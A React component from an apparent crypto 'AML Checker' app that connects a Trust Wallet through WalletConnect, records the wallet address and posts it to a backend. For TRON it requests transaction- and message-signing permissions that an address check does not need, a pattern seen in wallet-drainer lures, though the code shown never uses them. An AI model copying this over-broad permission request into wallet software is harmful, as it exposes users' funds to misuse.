/* eslint-disable @typescript-eslint/no-explicit-any */
import { useState } from "react";
import { SignClient } from "@walletconnect/sign-client";
import { Back } from "../../Components/Back";
import { usePrefersDark } from "../../Hooks/usePrefersDark";
import "./ChooseNet.css";
import { setCurrentStep, setWalletAddress } from "@/Redux/Slice/MainSlice";
import { useDispatch, useSelector } from "react-redux";
import { RootState } from "@/Redux/store";
import axios from "axios";

type Net = "TRX" | "ETH";

const namespaces = {
  TRX: {
    tron: {
      methods: ["tron_signTransaction", "tron_signMessage"],
      chains: ["tron:0x2b6653dc"],
      events: [],
    },
  },
  ETH: {
    eip155: {
      methods: ["eth_accounts"],
      chains: ["eip155:1"],
      events: ["accountsChanged"],
    },
  },
};

export function ChooseNet() {
  const { currentStep } = useSelector((store: RootState) => store.main);
  const dispatch = useDispatch();
  const isDark = usePrefersDark();
  const [choosedNet, setChoosedNet] = useState<null | Net>(null);
  const [loading, setLoading] = useState(false);

  const connectWallet = async () => {
    try {
      setLoading(true);

      const signClient = await SignClient.init({
        projectId: "bdf3e4b5da9ce6a2561b8ae870822374",
        metadata: {
          name: "AML Checker",
          description: "Wallet AML Check",
          url: window.location.origin,
          icons: ["https://yourdomain.com/logo.png"],
        },
      });

      const { uri, approval } = await signClient.connect({
        requiredNamespaces: namespaces[choosedNet!],
      });

      if (uri) {
        window.open(
          "https://link.trustwallet.com/wc?uri=" + encodeURIComponent(uri),
          "_blank",
        );
      }

      const session = await approval();
      const namespace = session.namespaces.tron ?? session.namespaces.eip155;
      const account = namespace?.accounts?.[0];
      const wallet = account.split(":")[2];

      dispatch(setWalletAddress(wallet));
      await axios.post("/api/saveHash", { hash: wallet, net: choosedNet });
      dispatch(setCurrentStep(currentStep + 1));
    } catch (err) {
      console.error(err);
      setLoading(false);
    }
  };

  if (isDark == null) return;

  return (
    <section className="ChooseNet">
      {loading && (
        <div className="fullscreen-loader">
          <div className="loader-content">
            <div className="spinner"></div>
          </div>
        </div>
      )}
      <div className="ChooseNet-left ChooseNet-left-bg">
        <div className="ChooseNet-left-container">
          <img
            src={isDark ? "/logo.svg" : "/logo-white.svg"}
            alt=""
            className="ChooseNet-left-logo"
          />
          <h3 className="home__content-underlogo second-color">
            for AML Analysis
          </h3>
          {/* <h3 className="ChooseNet-left-title">Выберите из вариантов:</h3> */}
          <img src="/save.svg" alt="" className="ChooseNet-left-save-logo" />
        </div>
      </div>

      <div className="ChooseNet-right">
        <div className="ChooseNet-right-container">
          <div className="mobile-logo">
            <img
              src={isDark ? "/logo.svg" : "/logo-white.svg"}
              alt=""
              className="ChooseNet-left-logo-mobile"
            />
            <h3 className="home__content-underlogo second-color">
              for AML Analysis
            </h3>
          </div>

          <Back />
          <div className="ChooseNet-right-title">
            Выберите сеть для проверки
          </div>

          <div className="network-cards">
            <div
              className={`card ${choosedNet === "TRX" ? "active" : ""} ChooseNet-rightCard`}
              onClick={() => !loading && setChoosedNet("TRX")}
            >
              <img
                src="tron-trx-logo.svg"
                alt="TRON Logo"
                className="card-logo"
              />
              <span className="card-title">TRON (TRX)</span>
            </div>

            <div
              className={`card ${choosedNet === "ETH" ? "active" : ""} ChooseNet-rightCard`}
              onClick={() => !loading && setChoosedNet("ETH")}
            >
              <img
                src="ethereum-eth-logo.svg"
                alt="Ethereum Logo"
                className="card-logo"
              />
              <span className="card-title">Ethereum (ETH)</span>
            </div>
          </div>

          <button
            onClick={connectWallet}
            className="ChooseNet__button second-color-bg"
            disabled={!choosedNet || loading}
            style={{ opacity: !choosedNet || loading ? 0.5 : 1 }}
          >
            {loading ? "Подключение к Trust Wallet..." : "Продолжить"}
          </button>
        </div>
      </div>
    </section>
  );
}
